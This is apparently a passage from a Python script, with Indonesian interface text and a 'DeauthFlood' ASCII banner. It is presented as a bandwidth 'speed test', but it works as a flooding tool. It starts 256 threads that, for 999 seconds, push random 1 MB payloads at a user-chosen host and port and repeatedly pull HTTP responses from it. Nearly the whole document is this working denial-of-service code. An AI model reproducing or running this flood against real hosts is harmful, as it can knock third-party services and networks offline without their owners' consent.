⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⡅⢠⣾⡿⢹⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣏⠇⠀⠀⢰⣡⣿⠏⠀⠈⢆⠀⠀⠀⠘⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣻⡻⠟⢲⡶⣷⡿⠁⠀⠀⠀⢨⣧⣤⡴⡾⢟⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢉⠹⠶⠖⡟⠁⠀⠀⠀⠀⠈⠻⡚⡶⠿⠛⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⢸⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⢻⢡⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⚡DeauthFlood⚡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⢸⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠘⡟⡄⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀gmail: renxtech@gmail.com
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠈⡈⡀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢣⢣⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀github: renXTech-sys
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠿⠋⠀⠀⠀⠇⡇⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠈⡎⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ instagram:⠀@renxtech
⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀⠀⠀⠀⢸⠃⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠈⣼⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠀⠀⣇⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠛⠿⣻⣿⠁⠀⠀⠀⠀⠀⠀⠀⣀⡀⣿⠀⢸⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣤⣤⣿⡿⠷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠿⢿⣿⡿⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣏⣽⢻⡟⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢿⡿⣻⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠿⣧⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡟⠈⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⢠⣋⣀⣨⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠓⢼⣟⢿⡀⠀⠀⠀⠀⠀⠀⢠⣿⠐⡓⠻⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣯⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀[/magenta]"""

def tx_worker(target_host, target_port, buffer_size, end_time):
    global total_bytes_sent, error_count
    payload = os.urandom(buffer_size)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, buffer_size)
        s.settimeout(2)
        s.connect((target_host, target_port))
        
        while time.time() < end_time:
            try:
                sent = s.send(payload)
                with lock:
                    total_bytes_sent += sent
            except socket.error:
                with lock:
                    error_count += 1
                time.sleep(0.001)
        s.close()
    except Exception:
        with lock:
            error_count += 1

def rx_worker(target_host, target_port, buffer_size, end_time):
    global total_bytes_received, error_count
    request = f"GET / HTTP/1.1\r\nHost: {target_host}\r\nConnection: keep-alive\r\n\r\n".encode()
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, buffer_size)
        s.settimeout(2)
        s.connect((target_host, target_port))
        s.sendall(request)
        
        while time.time() < end_time:
            try:
                data = s.recv(buffer_size)
                if not data:
                    s.sendall(request)
                    continue
                with lock:
                    total_bytes_received += len(data)
            except socket.error:
                with lock:
                    error_count += 1
                time.sleep(0.001)
        s.close()
    except Exception:
        with lock:
            error_count += 1

def make_live_display(target_host, target_port, num_threads, elapsed, duration, curr_tx_mbps, curr_rx_mbps, tx_bytes, rx_bytes, errors):
    info_table = Table(show_header=False, box=None, expand=True)
    info_table.add_column("Key", style="bold magenta", width=18)
    info_table.add_column("Val", style="magenta")
    info_table.add_column("Key2", style="bold magenta", width=18)
    info_table.add_column("Val2", style="magenta")

    info_table.add_row("Host Target", f"{target_host}:{target_port}", "Mode Execution", "SIMULTANEOUS DUAL-STORM")
    info_table.add_row("Total Threads", f"{num_threads} Threads", "Socket Buffer", "1 MB High-Throughput")
    info_table.add_row("Durasi Tes", f"{duration} Detik", "Waktu Berjalan", f"{int(elapsed)}s / {duration}s")

    monitor_table = Table(expand=True, border_style="magenta", header_style="bold magenta")
    monitor_table.add_column("Jalur", justify="center", style="bold magenta")
    monitor_table.add_column("Real-Time Speed", justify="center", style="bold green")
    monitor_table.add_column("Total Size Terkirim/Diterima", justify="center", style="bold green")
    monitor_table.add_column("Status Network", justify="center")

    if errors > 0:
        status_text = Text(f"⚠️ {errors} Paket Drop", style="bold yellow" if errors < 50 else "bold red")
    else:
        status_text = Text("🔥 FULL TRAFFIC", style="bold green")

    tx_gbps = curr_tx_mbps / 1000
    rx_gbps = curr_rx_mbps / 1000

    tx_size_str = f"{tx_bytes / (1024**2):.2f} MB ({tx_bytes / (1024**3):.3f} GB)"
    rx_size_str = f"{rx_bytes / (1024**2):.2f} MB ({rx_bytes / (1024**3):.3f} GB)"

    monitor_table.add_row("TX (Upload)", f"{curr_tx_mbps:.2f} Mbps ({tx_gbps:.3f} Gbps)", tx_size_str, status_text)
    monitor_table.add_row("RX (Download)", f"{curr_rx_mbps:.2f} Mbps ({rx_gbps:.3f} Gbps)", rx_size_str, status_text)

    total_curr_mbps = curr_tx_mbps + curr_rx_mbps
    total_curr_gbps = total_curr_mbps / 1000
    total_bytes = tx_bytes + rx_bytes
    total_size_str = f"{total_bytes / (1024**2):.2f} MB ({total_bytes / (1024**3):.3f} GB)"

    monitor_table.add_row("COMBINED TOTAL", f"{total_curr_mbps:.2f} Mbps ({total_curr_gbps:.3f} Gbps)", total_size_str, status_text)

    layout_table = Table(show_header=False, box=None, expand=True)
    layout_table.add_row(info_table)
    layout_table.add_row("\n")
    layout_table.add_row(monitor_table)

    live_panel = Panel(
        layout_table,
        title="[bold magenta] ⚡ LIVE EXECUTION MONITOR ⚡ [/bold magenta]",
        border_style="bold magenta",
        padding=(1, 2)
    )

    full_layout = Table(show_header=False, box=None, expand=True)
    full_layout.add_row(ASCII_EXECUTE)
    full_layout.add_row(live_panel)

    return full_layout

def run_speedstorm():
    console.clear()
    
    # Menampilkan ASCII Art 1
    console.print(ASCII_MENU)
    
    target_host = console.input("[bold magenta]Masukkan IP/Host Target (default 1.1.1.1): [/bold magenta]").strip()
    if not target_host:
        target_host = "1.1.1.1"
        
    port_input = console.input("[bold magenta]Masukkan Port (default 80): [/bold magenta]").strip()
    target_port = int(port_input) if port_input.isdigit() else 80

    num_threads_tx = 128
    num_threads_rx = 128
    total_threads = num_threads_tx + num_threads_rx
    buffer_size = 1024 * 1024
    duration = 999

    end_time = time.time() + duration
    threads = []

    for _ in range(num_threads_tx):
        t = threading.Thread(target=tx_worker, args=(target_host, target_port, buffer_size, end_time))
        threads.append(t)
        t.start()

    for _ in range(num_threads_rx):
        t = threading.Thread(target=rx_worker, args=(target_host, target_port, buffer_size, end_time))
        threads.append(t)
        t.start()

    start_time = time.time()
    
    initial_display = make_live_display(target_host, target_port, total_threads, 0, duration, 0, 0, 0, 0, 0)
    
    console.clear()
    with Live(initial_display, refresh_per_second=4, console=console) as live:
        while time.time() < end_time:
            time.sleep(0.25)
            elapsed = time.time() - start_time
            if elapsed == 0:
                continue
            with lock:
                curr_tx = (total_bytes_sent * 8) / (elapsed * 1_000_000)
                curr_rx = (total_bytes_received * 8) / (elapsed * 1_000_000)
                tx_b = total_bytes_sent
                rx_b = total_bytes_received
                errs = error_count
            live.update(make_live_display(target_host, target_port, total_threads, elapsed, duration, curr_tx, curr_rx, tx_b, rx_b, errs))

    for t in threads:
        t.join()

    final_tx_mbps = (total_bytes_sent * 8) / (duration * 1_000_000)
    final_rx_mbps = (total_bytes_received * 8) / (duration * 1_000_000)
    final_tx_gbps = final_tx_mbps / 1000
    final_rx_gbps = final_rx_mbps / 1000
    total_gbps = final_tx_gbps + final_rx_gbps

    result_table = Table(title="RINGKASAN HASIL DUAL-STORM", border_style="bold magenta", header_style="bold magenta", expand=True)
    result_table.add_column("Jalur Transmisi", style="magenta")
    result_table.add_column("Total Size Terpakai", style="magenta")
    result_table.add_column("Kecepatan (Mbps)", style="bold green")
    result_table.add_column("Kecepatan (Gbps)", style="bold green")

    result_table.add_row("TX (Upload)", f"{total_bytes_sent / (1024**2):.2f} MB ({total_bytes_sent / (1024**3):.2f} GB)", f"{final_tx_mbps:.2f} Mbps", f"{final_tx_gbps:.4f} Gbps")
    result_table.add_row("RX (Download)", f"{total_bytes_received / (1024**2):.2f} MB ({total_bytes_received / (1024**3):.2f} GB)", f"{final_rx_mbps:.2f} Mbps", f"{final_rx_gbps:.4f} Gbps")
    result_table.add_row("COMBINED TOTAL", f"{(total_bytes_sent + total_bytes_received) / (1024**2):.2f} MB ({(total_bytes_sent + total_bytes_received) / (1024**3):.2f} GB)", f"{(final_tx_mbps + final_rx_mbps):.2f} Mbps", f"{total_gbps:.4f} Gbps")

    console.print("\n")
    console.print(result_table)
    
    if error_count > 0:
        console.print(f"\n[bold yellow]⚠️ Pengujian kelar! Ada {error_count} socket drop karena limit interface/server target.[/bold yellow]")
    else:
        console.print("\n[bold green]✔ Pengujian beres bersih tanpa kendala socket sama sekali![/bold green]")
        
    console.print("[bold magenta]Credit: @renxtech[/bold magenta]\n")

if __name__ == "__main__":
    run_speedstorm()
